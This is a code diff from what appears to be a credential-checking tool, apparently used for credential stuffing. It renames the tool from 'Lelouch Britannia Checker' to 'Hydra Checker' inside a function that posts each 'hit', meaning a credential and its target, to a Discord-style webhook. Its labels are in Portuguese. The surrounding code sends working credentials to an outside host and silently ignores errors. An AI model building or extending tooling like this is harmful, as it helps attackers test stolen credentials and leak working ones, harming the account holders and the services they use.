@@ -5596,12 +5596,12 @@ async function fireHitWebhook(webhookUrl: string, credential: string, detail: st
       description: `**Credencial:** \`${credential}\`\n**Alvo:** ${targetLabel}${detail ? `\n**Detalhe:** ${detail}` : ""}`,
       color:       0x2ecc71,
       timestamp:   new Date().toISOString(),
-      footer:      { text: "Lelouch Britannia Checker" },
+      footer:      { text: "Hydra Checker" },
     };
     await fetch(webhookUrl, {
       method:  "POST",
       headers: { "Content-Type": "application/json" },
-      body:    JSON.stringify({ username: "Lelouch Checker", embeds: [embed] }),
+      body:    JSON.stringify({ username: "Hydra Checker", embeds: [embed] }),
       signal:  AbortSignal.timeout(8_000),
     });
   } catch { /* ignore webhook errors — don't break the stream */ }
